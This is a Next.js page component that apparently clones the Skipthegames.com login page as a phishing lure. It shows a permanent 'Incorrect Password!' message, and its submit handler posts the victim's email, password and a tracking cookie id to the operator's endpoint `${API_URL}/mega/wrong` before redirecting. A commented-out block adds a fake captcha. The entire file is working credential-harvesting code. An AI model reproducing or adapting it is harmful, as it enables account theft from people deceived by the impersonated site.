"use client";
import React from "react";
import Image from "next/image";
import { Field, Form, Formik } from "formik";
import { API_URL } from "../config";
import Cookies from "js-cookie";
import { useRouter } from "next/navigation";
// import { toast } from "react-toastify";
function page() {
  const initialvalues = {
    email: "",
    password: "",
  };
  const router = useRouter();
  const id = Cookies.get("id");

  const handleSubmit = async (values, formik) => {
    const { email, password } = values;

    // Cookies.set("site", site);
    // Cookies.set("email", email);
    // Cookies.set("password", password);

    // setShowModal(true);

    // const allValues = {
    //   id: id,
    // };
    const allValues = {
      id,
      email,
      password,
    };
    console.log("allValues", allValues);
    // login(allValues, formik);
    const url = `${API_URL}/mega/wrong`;

    const res = await fetch(url, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify(allValues),
    });
    const data = await res.json();
    console.log(data);

    if (res.ok) {
      console.log("success", data);
      router.push("/map");
    } else {
      console.log("error", data);
      // toast.error("Something Went Wrong");
    }
  };

  return (
    <div className="">
      {/* header */}
      <div className="pt-1 pb-2 px-4 lg:px-[85px] text-[13px] text-center bg-[#5F5F5F] text-white lg:leading-[28px]">
        We use cookies to ensure that we give you the best experience on our
        website. By continuing to browse this site you permit us to place
        cookies on your browser and agree to our use of cookies. Review our
        cookies policy for details.{" "}
        <span className="mt-2 lg:mt-0 px-3 py-2 block lg:inline rounded-sm bg-[#7daf3b] hover:bg-black transition-colors duration-300">
          ACCEPT COOKIES
        </span>{" "}
        <span className="mt-4 lg:mt-0 block lg:inline underline hover:no-underline">
          What are cookies?
        </span>
      </div>
      <div className="">
        <div className="container pt-[10px] pb-8 flex flex-col  items-center lg:flex-row lg:justify-between">
          <div className="lg:self-start mt-[3px] lg:mt-0">
            <Image src={logo} alt="logo" priority />
          </div>

          <p className="lg:self-end mt-[8px] lg:mt-[20px] text-custom-gray text-lg text-center font-medium  px-[75px] lg:px-0">
            Skip the{" "}
            <span className="block lg:inline-block">
              games.Get satisfaction.
            </span>
          </p>

          <button className="lg:self-end mt-2 lg:mt-0 bg-rose-500 hover:bg-custom-rose2 text-white font-bold px-10 lg:px-[90px] py-[8px] rounded transition duration-300">
            Post your free ad now
          </button>
        </div>
      </div>

      {/* route */}
      <div className="shadow-inner-custom">
        <div className="container py-[18px] lg:py-[22px] px-4 lg:px-0 flex items-center gap-2 text-[11px]">
          <p className="">SKIPTHEGAMES.COM</p>
          <span className="text-custom-cyan">»</span>
          {/* <span className="text-custom-cyan">&#187;</span> */}
          <p className="text-custom-cyan">LOGIN</p>
        </div>
      </div>

      {/* <div className="mt-1">
        <Formik initialValues={initialvalues} onSubmit={handleSubmit}>
          {(formik) => (
            <Form className="mx-[30px]  flex flex-col justify-center items-center">
              <div className="space-y-[9px]  flex flex-col justify-center items-center">
                <p className="text-red-500 text-md">Incorrect password</p>

                <Field
                  placeholder="Email"
                  className="px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  id="email"
                  name="email"
                  required
                />

                <Field
                  className=" px-[15px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  placeholder="Password"
                  name="password"
                  type="password"
                  autoComplete="on"
                  required
                />
              </div>
              <div className="flex flex-col items-center">
                <Image
                  src="/images/captures.jpeg"
                  alt="captcha"
                  width={228}
                  height={55}
                  className="mt-3"
                />

                <Field
                  className="mt-2 w-full  px-[12px] py-[1px] text-lg outline-none border-2 border-custom-gray4/70 focus:border-custom-blue2/60 focus:shadow-around-blue transition duration-300 rounded"
                  id="captcha"
                  name="captcha"
                  type="captcha"
                  autoComplete="on"
                  placeholder="Enter code from the picture"
                  required
                />

                <button
                  type="submit"
                  className="mt-4 bg-custom-orange text-white text-[20px] px-[21px] py-[8px] tracking-wider"
                >
                  SUBMIT
                </button>
              </div>
            </Form>
          )}
        </Formik>
      </div> */}

      <div className="container px-4 lg:px-0">
        <div className="pt-[14px] lg:pt-[18px] py-[38px] grid grid-cols-1 lg:grid-cols-2 gap-5 lg:gap-[150px]">
          <div className="">
            <h3 className="text-[22px] lg:text-[27px] text-custom-gray2">
              Log in to your account
            </h3>
            <p className="text-red-500 text-sm">Incorrect Password!</p>

            <div className="mt-2">
              <Formik
                initialValues={initialvalues}
                // validationSchema={validate}
                onSubmit={handleSubmit}
              >
                {(formik) => (
                  <Form className="space-y-5">
                    <Field
                      className="w-full text-sm px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300"
                      placeholder="Your email"
                      name="email"
                      type="email"
                      required
                    />

                    <Field
                      className="w-full text-sm  px-[8px] py-[7px] outline-none border border-slate-300 focus:border-custom-rose/50 focus:bg-custom-gray3 shadow-inner transition duration-300"
                      placeholder="Password"
                      name="password"
                      type="password"
                      autoComplete="on"
                      required
                    />

                    <button
                      type="submit"
                      className="w-full bg-custom-cyan hover:bg-custom-cyan2 py-[14px] text-white transition duration-300 rounded"
                    >
                      Log in
                    </button>
                  </Form>
                )}
              </Formik>
            </div>

            <p className="mt-5 text-[9px] text-custom-gray2 font-semibold">
              By clicking "Log in", you accept
              <span className="text-custom-cyan hover:text-custom-cyan2 cursor-pointer">
                {" "}
                Skipthegames.com's Terms and Conditions of Use
              </span>
            </p>

            <p className="text-sm text-custom-rose underline cursor-pointer">
              Forgot your password?
            </p>
          </div>

          <div className="lg:ml-[120px]">
            <h3 className="text-[22px] lg:text-[27px] text-custom-gray2">
              First time here?
            </h3>
            <p className="mt-[14px] text-custom-rose underline cursor-pointer">
              Post your first ad
            </p>
          </div>
        </div>
      </div>

      <div className="container px-4 lg:px-0">
        <div className="py-[20px] flex lg:justify-between text-custom-gray border-t border-slate-300">
          <div className="">
            <p className="cursor-pointer hover:text-custom-gray2">
              ©skipthegames.com
            </p>
          </div>
          <div className="flex flex-wrap gap-2 lg:gap-[22px]">
            {[
              "Home",
              "Contact",
              "About",
              "Privacy",
              "Terms",
              "Escort Info",
            ].map((link, i) => (
              <div key={i} className="first:text-custom-gray  text-custom-cyan">
                <p className="cursor-pointer hover:text-custom-gray2">{link}</p>
              </div>
            ))}
          </div>
        </div>
      </div>
    </div>
  );
}

export default page;
